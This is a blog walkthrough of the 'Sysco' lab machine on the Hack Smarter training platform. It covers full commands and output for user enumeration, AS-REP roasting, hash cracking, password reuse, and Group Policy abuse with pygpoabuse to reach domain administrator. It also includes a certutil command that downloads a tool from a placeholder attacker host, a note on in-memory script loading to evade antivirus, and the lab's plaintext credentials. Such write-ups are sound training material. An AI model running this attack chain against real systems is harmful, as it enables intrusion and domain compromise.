---
title: "Sysco Walkthrough"
date: 2025-11-01 00:00:00 +00:00
categories: [Hack Smarter]
tags: [HackSmarter]
permalink: /2025/11/01/post-title/
description: "Sysco - Medium rated Active Directory Machine by Luis M."
published: true
---

# Scenario 
> Sysco is a managed service provider that engaged us to perform an external penetration test against their Active Directory environment. From an external vantage, the assessment simulates a realistic, determined adversary: enumerate public-facing services and web assets to harvest usernames, gain an initial foothold, move laterally through the network, and escalate privileges to achieve Domain Administrator access. Because EDR/AV is present, the engagement emphasizes living‚Äëoff‚Äëthe‚Äëland techniques and low‚Äënoise operations while thoroughly documenting findings and artifacts.
- [Machine URL](https://www.hacksmarter.org/events/4fff8db5-5c65-4d02-bca8-1e7984ae1f2f)

![Initial](/assets/images/sysco.png)


## Recon
----
### Initial Nmap Scan



- I ran Rustscan & Autorecon 

```go
nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/home/kali/Documents/Obsidian/HackSmarter/Sysco/External/enum/results/10.1.43.102/scans/_full_tcp_nmap.txt" -oX "/home/kali/Documents/Obsidian/HackSmarter/Sysco/External/enum/results/10.1.43.102/scans/xml/_full_tcp_nmap.xml" $IP

Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-30 20:39 EDT
Nmap scan report for sysco.local (10.1.43.102)
Host is up (0.026s latency).

53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)
|_http-title: Index - Sysco MSP
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-favicon: Unknown favicon MD5: DD229045B1B32B2F2407609235A23238
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-10-31 01:08:15Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: SYSCO.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: SYSCO.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
|_ssl-date: 2025-10-31T01:09:58+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.SYSCO.LOCAL
| Issuer: commonName=DC01.SYSCO.LOCAL
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-17T05:14:51
| Not valid after:  2026-04-18T05:14:51
| MD5:   fdbb:6553:3042:be9f:3c1d:15b2:60db:5e1f
| SHA-1: 017c:b073:a3a7:1843:0ffd:7a2b:184a:c07b:a830:c0a8
| rdp-ntlm-info: 
|   Target_Name: SYSCO
|   NetBIOS_Domain_Name: SYSCO
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SYSCO.LOCAL
|   DNS_Computer_Name: DC01.SYSCO.LOCAL
|   DNS_Tree_Name: SYSCO.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-10-31T01:09:18+00:00
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49683/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49743/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49808/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
```
Key info from this: 
- DNS_DOMAIN_NAME: SYSCO.LOCAL
- DNS_Computer_Name: DC01.SYSCO.LOCAL
- Domain system time

> **Note on Kerberos timing:** If we need to do KRB attacks, keep in mind that Kerberos is extremely time-sensitive. A time difference of more than ~5 minutes between your machine and the target server will cause authentication to fail. This is a security feature designed to prevent replay attacks, so make sure your system clock is synchronized before attempting any Kerberos exploits.
{: .prompt-tip }




```zsh
sudo ntpdate <$target IP>
```


### Port 80 - HTTP 

### Site Crawling: 

![Visiting Site](/assets/images/SyscoMSP.png)
*Index.html* 

![Team](/assets/images/Team.png)
*Employees + Roles (possible userlist)*

- Based on the roles and assumed permissions of each role, we will likely need to pivot in this order 

1. Sarah Johnson ‚Äî Sales Rep ‚ö™  
   - Likely low-privilege user; good initial target for credential harvesting or phishing.

2. Jack Downland ‚Äî Helpdesk Associate ‚ö™  
   - Low-to-mid privileges; may have access to shared assets useful for lateral movement.

3. Lainey Moore ‚Äî Systems Engineer üî∂  
   - Elevated permissions; potential access to servers, stacks, or service accounts.

4. Greg Shields ‚Äî System Administrator üîí  
   - High-value target (possible domain or local admin). Final escalation objective once foothold/lateral movement is achieved.

> Mapping the users like this help map outbound relations and shortest paths to high‚Äëvalue principals once we ingest data to Bloodhound.

#### Directory Fuzzing
```zsh
ffuf -u http://sysco.local/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -ic -c
```
![FFUF](/assets/images/Ffuf.png)
*FFUF Output*
- we see a `301` for RoundCube. 

I also did vhost fuzzing on `SYSCO.LOCAL` but got nothing.

There is also a `roundcube` instance running on /roundcube

![RoundCube](/assets/images/Roundcube%20webmail.png)

- Checked source code for version, but none. From OSCP prep... I know 1.6.10 < is vuln to RCE.

### Port 88 - Kerberoasting 

#### Create a Userlist 

[Username-anarchy](https://github.com/urbanadventurer/username-anarchy) can be used for this and usually my go-to but.. AI.

```txt
Greg Shields
Sarah Johnson
Jack Dowland
Lainey Moore
```

![Lazy](/assets/images/claude.png)

##### Spray these users against the domain with [Kerbrute](https://github.com/ropnop/kerbrute)

```zsh
./kerbrute_linux_amd64 userenum -d sysco.local --dc $IP /home/kali/Documents/Obsidian/HackSmarter/Sysco/External/Users.txt
```
![Kerbrute](/assets/images/Kerbrute.png)

- Kerbrute returned valid accounts; one account responded to an AS-REP request: `jack.dowland`

![Denzel](/assets/images/denzel.gif)

#### Saving Hash & Cracking

```bash
echo '$krb5asrep' >> hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

- That hash did not want to crack so I used `nxc` to re-dump.

```zsh
nxc ldap $IP -u 'jack.dowland' -p '' --asreproast out.txt
```

![asreproast](/assets/images/asreproast.png)

Got a password of `musicman1` lul.

So first set of creds = 

> jack.dowland:musicman1

![creds](/assets/images/giphy.gif)

## Foothold
----
Validating creds with SMB

```zsh
nxc smb $IP -u 'jack.dowland' -p 'musicman1' 
```
![SMB](/assets/images/SMBValidate.png)
*Validating creds + Userlist with `--users`*

With creds, we can attempt to login to that roundcube instance on port 80.

- Since I have creds, I'll start Bloodhound and mark `jack.dowland` as owned.


```zsh
nxc ldap $IP -u 'jack.dowland' -p 'musicman1' --dns-server $IP --bloodhound --collection ALL
```
![nxc-bh](/assets/images/nxc-bh.png)
*Bloodhound collection via `nxc`*

![Jack-owned](/assets/images/jack%20downland%20bh%20owned.png)
*Marking Jack as owned*

Intially, I thought pre-Windows2k was the vuln but that didn't make sense since all users had this.
![pre-win](/assets/images/prewin2k.png)
*No outbound controls of Jack, only inbound controls as shown here* 


> **Reference:** [Hacking Articles - Pre-Windows 2000 Computers](https://www.hackingarticles.in/pre2k-active-directory-misconfigurations/)



### Roundcube 

I was able to login with those creds to the Roundcube Webmail instance. 
- Inbox was empty
- I was able to get version under `About` (1.6.11)
- Sent mail shows Jack sent a router configuration back to `Lainey.Moore`
> Jack tells Lainey - "Client made a ticket on the new router your configured recently.."

- So we know, Lainey was the one who created this config and set the password.


![RoundcubeVersion](/assets/images/Roundcube%20Version.png)
*Version*

- [Checking Roundcube CVE's](https://www.cvedetails.com/vulnerability-list/vendor_id-8905/Roundcube.html)
![Roundcube RCE](/assets/images/Roundcube%20CVE.png)
*Roundcube before 1.6.11 allows Authenticated RCE*

![RoundcubeSent](/assets/images/SentMail.png)
*Sent mail from Jack's inbox* 

![RouterCfg](/assets/images/Routercfg.png)
*Router config Lainey setup*

- We know Lainey is a systems engineer and seems to be Jack's boss

- While examining the router config, we spotted a hash prefixed with `$1$`. A lookup in the Hashcat wiki identified this as a Cisco IOS Type-5 (MD5) password hash, which uses Hashcat mode 500. [(Hashcat mode 500)](https://hashcat.net/wiki/doku.php?id=example_hashes).
![foundHash](/assets/images/Finding-hash.png)
*Hascat wiki - looking for same prefix string*

### Cracking Cisco Type 5 Hash

```zsh
echo `$1$` >> cisco.hash
hashcat -m 500 cisco.hash /usr/share/wordlists/rockyou.txt
hashcat -m 500 cisco.hash --show

$1$mERr$isugnYiHsjHT.i.tc2GDY.:Chocolate1
```

- So we have the password that Lainey set up. Human nature tells us to test his habits and see if this password works with his account

## User.txt

```zsh
nxc smb $IP -u 'lainey.moore' -p 'Chocolate1' 
```
![winrm-lainey](/assets/images/winrm-lainey.png)
*Pwn3d!*

So we can get `user.txt`
![user.txt](/assets/images/user.txt.png)

## Priv-esc
----
We've established access as `Lainey` and identified `Greg` (the Sys Admin) as our next target. Checking Lainey's group memberships reveals they belong to `RDP Users` and `Windowns Remote Management users`.

### Powerup.ps1

Initial transfer attempt using 
```cmd
certutil.exe -urlcache -f http://[ATTACKER_IP]/PowerUp.ps1 PowerUp.ps1
```
 was blocked by Windows Defender's real-time protection.
![Defender](/assets/images/AV-Block.png)
*Transfer worked, execution did not*

Pivoted to a fileless execution approach using `IEX (New-Object Net.WebClient).DownloadString()` to load PowerUp directly into memory, but this was also intercepted - presumably by AMSI.

### Since `lainey` has RDP privs, I use Remmina to RDP in

- I also check Defender stats

```powershell
Get-MpComputerStatus
```
![Defender-stats](/assets/images/Defender-info.png)
*Checking Windows Defender and AMSI configuration with `Get-MpComputerStatus`*

- Key findings from Get-MpComputerStatus:
   - AMServiceEnabled: True - Windows Defender antimalware service is running
   - AntispywareEnabled: True - Real-time protection active
   - AntivirusEnabled: True - AV scanning active
   - RealTimeProtectionEnabled: True - Active monitoring of file operations and script execution

#### Lainey's Desktop
- We see 3 files
   - notes
   - `Putty - HS Router Login`
   - putty

![LaineyDesktop](/assets/images/Lainey-Desktop.png)

- Analysis of the `Putty - HS Router Login.lnk` file revealed hardcoded SSH credentials in the shortcut's target field. The command line argument exposes plaintext authentication material:

```zsh
ssh netadmin@10.0.0.1 -pw 5y5coSmarter2025!!!
```

- Initially, I thought pivoting internally would be the next step based on the new found subnet(10.0.0.1) so I prep [Ligolo](https://github.com/nicocha30/ligolo-ng)
   - Before that, I spray this password against the other known-users. Since user here is `netadmin` 

![newSpray](/assets/images/NewSpray.png)
*We get a valid password for `Greg.shields`

>This represents a continuation of the password reuse pattern identified earlier. The administrator has likely configured this service account with their personal credentials, violating basic security hygiene principles.
{: .prompt-info }

## Root
---
- I open Bloodhound and view `Greg.Shields` outbound controls

### **ACL Analysis - GPO Abuse Path Identified:**

`Greg.Shields` ‚Üí member of ‚Üí `GROUP POLICY CREATOR OWNERS@SYSCO.LOCAL` ‚Üí this group has control over `DEFAULT DOMAIN POLICY@SYSCO.LOCAL`

This group has full control over `DEFAULT DOMAIN POLICY@SYSCO.LOCAL`:
- `WriteOwner` - Can change object ownership
- `GenericWrite` - Can modify GPO settings
- `GenericAll` - Full control over the object
- `WriteDacl` - Can modify permissions

This represents a direct path to domain compromise via GPO modification.
![GShields-owned](/assets/images/greg-shields-owned.png)
*Ownership view*

![Default-pol](/assets/images/def-domains-pol.png)
*Bloodhound gives us the specific object information.*

For GPO abuse techniques, we need the Default Domain Policy's unique identifier. This GUID can be retrieved from:
1. The Distinguished Name field: `CN={31B2F...}`
2. The SYSVOL path: `\\SYSCO.LOCAL\SYSVOL\SYSCO.LOCAL\Policies\{31B2F...}`

This GUID will be used to specify our target when injecting malicious GPO settings.

> GPOAbuse options from TheHackerRecipes

![HackSmarterGPO](/assets/images/GPOAbuseOptions.png)

#### PyGPOAbuse.py

Per the screenshot from HackSmarter - I use `pygpoabuse.py`

What it does:
Abuses Greg Shield's membership in "Group Policy Creator Owners" to modify the Default Domain Policy GPO, adding a scheduled task that makes greg.shields a local administrator on all domain computers.

```zsh
‚ùØ python pygpoabuse.py 'SYSCO.LOCAL'/'greg.shields':'5y5coSmarter2025!!!' -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -command 'net localgroup Administrators greg.shields /add'

[+] ScheduledTask TASK_5532b431 created!
```
##### Force GPO update & Verify Admin

```cmd
gpupdate /force
```
![GPUpdate](/assets/images/gpupdate.png)
*Force update*

### Root.txt

```ps
net localgroup administrators
whoami
ls
type root.txt
```

![root](/assets/images/root.png)


![Leaderboard](/assets/images/top%2030-2.png)

![Rami](/assets/images/mr%20robot.gif)







